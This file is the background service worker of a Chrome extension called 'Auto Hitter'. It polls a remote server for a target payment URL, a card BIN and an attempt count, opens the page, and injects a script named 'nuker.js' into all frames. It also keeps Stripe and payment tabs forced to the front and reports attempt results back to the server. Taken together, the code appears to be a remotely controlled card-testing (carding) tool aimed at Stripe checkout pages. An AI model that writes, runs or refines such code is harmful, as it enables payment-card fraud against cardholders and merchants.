/**
 * Auto Hitter - Ultimate Pro Bridge Worker
 * Optimized for High-Responsiveness and Extreme Penetration.
 */

const API_BASE = "https://autohittertesetmode.onrender.com";

async function pollCloudSession() {
    try {
        const resp = await fetch(`${API_BASE}/get-session`);
        const data = await resp.json();

        if (data && data.active && data.url) {
            const local = await chrome.storage.local.get(["maActive", "maUrl", "maLastSessionId"]);
            
            // Trigger new session if maActive is false, URL is new, or Session ID is new
            if (!local.maActive || local.maUrl !== data.url || local.maLastSessionId !== data.session_id) {
                console.log("[Bridge Worker] Starting new sequential session. Opening single tab...");
                
                await chrome.storage.local.set({
                    "maActive": true,
                    "maUrl": data.url,
                    "maBin": data.bin,
                    "maCount": parseInt(data.count),
                    "maTries": 0,
                    "maLastSessionId": data.session_id
                });

                chrome.tabs.create({ url: data.url, active: true }, (tab) => { 
                    chrome.windows.update(tab.windowId, { focused: true, state: "normal" });
                    
                    const inject = () => {
                        try {
                            chrome.scripting.executeScript({
                                target: { tabId: tab.id, allFrames: true },
                                files: ["script/nuker.js"]
                            });
                        } catch (e) {}
                    };

                    // Try injecting at intervals to catch dynamic frames
                    setTimeout(inject, 1500);
                    setTimeout(inject, 4000);
                    setTimeout(inject, 8000);
                });
            }
        }
    } catch (e) {}
}

// Ensure injection on navigation
chrome.webNavigation.onCompleted.addListener((details) => {
    if (details.frameId === 0) {
        chrome.storage.local.get(["maActive"], (data) => {
            if (data.maActive) {
                chrome.scripting.executeScript({
                    target: { tabId: details.tabId, allFrames: true },
                    files: ["script/nuker.js"]
                }).catch(() => {});
            }
        });
    }
});

// Background polling - 2.5 seconds
setInterval(pollCloudSession, 2500);

// Window Watchdog (Prevent Minimize)
setInterval(async () => {
    const data = await chrome.storage.local.get(["maActive"]);
    if (data.maActive) {
        chrome.tabs.query({ active: true }, (tabs) => {
            const stripeTab = tabs.find(t => t.url && (t.url.includes("stripe.com") || t.url.includes("bypixel.site") || t.url.includes("/pay/") || t.url.includes("/c/pay/")));
            if (stripeTab) {
                chrome.windows.update(stripeTab.windowId, { state: "maximized", focused: true });
            }
        });
    }
}, 5000);

// Immediate sync pulse listener
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === "START_SYNC") {
        console.log("[Bridge Worker] Pulse received. Syncing instantly...");
        pollCloudSession();
    }
    
    // Status Board Forwarding
    if (request.type === "CLOSE_TAB" && sender.tab) { 
        chrome.tabs.remove(sender.tab.id); 
    } 
    
    if (request.type === "MA_STATUS") {
        console.log("[Bridge Worker] Status Report:", request.text);
        
        // Auto-increment tries ONLY if hit started
        if (request.text.includes("Attempt")) {
            chrome.storage.local.get(["maTries"], (data) => {
                chrome.storage.local.get(["maLogs"], (res) => { let l = res.maLogs || []; l.push({text: request.text, status: request.status}); chrome.storage.local.set({ "maTries": (data.maTries || 0) + 1, "maLogs": l }); });
            });
        }

        // POST to Cloud with Retry Logic
        const postStatus = (retries = 3) => {
            fetch(`${API_BASE}/update-status`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    text: request.text,
                    status: request.status || ""
                })
            }).catch(e => {
                if (retries > 0) setTimeout(() => postStatus(retries - 1), 1000);
            });
        };
        postStatus();
    }
});

// Maintain original background logic
try {
    importScripts("background.js");
} catch (e) {
    console.error("[Bridge Worker] Original background logic error:", e);
}
